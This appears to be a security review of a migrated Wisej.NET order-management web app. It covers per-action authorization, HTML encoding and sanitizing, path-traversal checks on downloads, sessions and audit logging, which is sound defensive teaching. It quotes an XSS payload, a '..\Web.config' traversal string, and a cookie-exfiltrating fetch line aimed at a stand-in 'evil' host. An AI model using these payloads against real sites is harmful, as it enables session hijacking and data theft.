# Security review — OrderDesk.Web reviewed as a web app, not a desktop behind the office LAN

LegacyOrderDesk trusted its own process: the login form set a static user, every button trusted it, `File.Open`
meant the user's disk, a label's text was inert. On the web the **browser is the untrusted side**: every click is a
request anyone can forge, every string that arrives names something on a shared server, and a label can be HTML.
Six checklist items, each with the code that enforces it and the console button that proves it.

| # | Item | Enforced by | Proof (Security tab) |
|---|---|---|---|
| 1 | **Authentication & authorization on the server, per action** | `Security/AuthService.cs`: `SignIn(user, password)` verifies a salted SHA-256 hash (constant-time compare) and stores a `UserSessionContext` in `Application.Session` — this session only. `Authorize(permission)` / `Demand(permission)` re-read the session on **every** action: `orders.export` (Export), `files.download` (Download). Roles: kelly = Manager (read, export, download, delete), sam = Clerk (read). | **Sign in sam** → Orders tab **Export** → red banner *Export denied on the server: 'orders.export' denied: role Clerk lacks 'orders.export'.* — the button was clickable, the server still said no. **kelly, wrong password** → denied, audited ✕, session still empty. |
| 2 | **Input validation and output encoding** | Validation on the server (Module 5's `OrderValidator` for order fields; `DownloadGuard.Resolve` for file names). Encoding is Wisej.NET's default: `Label.Text` is HTML-encoded unless `AllowHtml = true`. `HtmlSanitizer.Encode` = `WebUtility.HtmlEncode` for anything rendered by other means. | **Render notes** → `labelEncoded` shows `<b>Rush</b> order <img src=x onerror="alert(1)"> <i>ship Friday</i>` literally. |
| 3 | **AllowHtml with care** | Policy: `AllowHtml = true` only on content that is trusted (our own markup) or came through `HtmlSanitizer.Sanitize` (whitelist `b`, `i`, `br`, no attributes, everything else removed and encoded). Exactly one label on user data has it (`labelSanitized`); `labelRaw` is the documented failure path and stays empty until the unsafe button is pressed. | **Render notes** → `labelSanitized` shows **Rush** order *ship Friday*, trace `HtmlSanitizer.Sanitize kept 4 tag(s) (b, i, br) · removed 1: <img src=x onerror="alert(1)">`. **Render raw (unsafe)** → the `<img>` becomes a DOM element; the browser fires `onerror` → `alert(1)` (if your browser shows the alert, that is user text executing in your session); red banner; audit row ✕ `allowhtml.raw`. |
| 4 | **Download handlers: permission + no arbitrary server paths** | `Security/DownloadGuard.cs`: `Demand(files.download)` → `Resolve(name)` rejects rooted paths and `..`, combines under `AppConfig.StorageRoot`, re-checks the full path starts with the root → `File.Exists` → `Application.Download(fullPath)`. The browser's string is never passed to `Download`. | **Sign in kelly** → **Download** `exports/orders.csv` → file streams, audit ✓ with byte count. **Try ..\Web.config** → red banner *Path traversal rejected: '..\Web.config'.*, audit ✕ `download REJECTED`. **Sign in sam** → **Download** → denied before the path is even resolved. |
| 5 | **Session lifecycle** | The user context lives in `Application.Session`, created by Wisej.NET per browser session (new id per tab, no fixation via URL); `SignOut` clears it; Module 4 handles `Application.SessionTimeout` / `ApplicationExit` to release per-session resources; a second tab starts as nobody. The samples keep their own tiny user model instead of ASP.NET Core authentication — a production app maps OpenID Connect claims to the same roles. | **Open second session ↗** → the new tab's `labelAuth` = `AuthService.Current = (nobody)` while the first tab is still kelly. **Sign out** → `Application.Session.UserContext = null`. |
| 6 | **Audit logging — who did what, when, server-side** | `Security/AuditLog.cs`: process-wide, append-only, behind a lock; `Record(action, detail, allowed)` stamps UTC time, user, short session id; denials are recorded inside `Authorize` so no caller can forget; every line also goes to `AppLog` (`App_Data/logs/orderdesk-yyyyMMdd.log`). Read by the grid through a 1 s `Wisej.Web.Timer` that redraws only when `AuditLog.Version` changed. | `gridAudit` shows ✓/✕ rows for sign-in, authorize denials, export, download, print, theme, session-start — from **every** session. Sign in as sam in the second tab: the first tab's grid gains `sign-in sam` within a second and the trace says `• server AuditLog (other session) 1 new entry from session xxxxxx: sign-in sam`. |

## The injection example, spelled out

Order notes are user-entered. The desktop `Label.Text` rendered `<img src=x onerror="alert(1)">` as those characters.
A Wisej.NET label with `AllowHtml = true` sets the browser element's innerHTML: the `<img>` is created, `src=x`
fails to load, the browser executes `onerror`. `alert(1)` is the harmless proof; the same slot carries
`fetch('https://evil/?c=' + document.cookie)` or a request that acts as the signed-in manager. This is the biggest
injection risk in a migrated app because the switch is one property on a control that used to be safe. The fix is
not "escape more carefully" but "do not set `AllowHtml` on user data" — and where markup is a feature (bold, italic),
whitelist it (`HtmlSanitizer`), never blacklist.

## Old risks that stay on the list

SQL injection (parameterize; the in-memory repository hides this here), insecure storage of secrets (the license key
and connection strings move out of `Web.config` — `deploy/appsettings.Production.notes.md`), over-permissive roles
(the Clerk/Manager split is deliberately narrow), and the temptation to expose server operations to the browser
(only `MainPage` handlers are reachable; nothing in `Security/` or `Diagnostics/` is callable from the client).

## Evidence summary

Buttons, in order: **Sign in kelly · Download · Try ..\Web.config · Sign out · Sign in sam · Download · Export
(Orders tab) · kelly, wrong password · Render notes · Render raw (unsafe)** — each produces the trace line, banner
and audit row listed in the table; the README's *What to try* table repeats the exact texts.
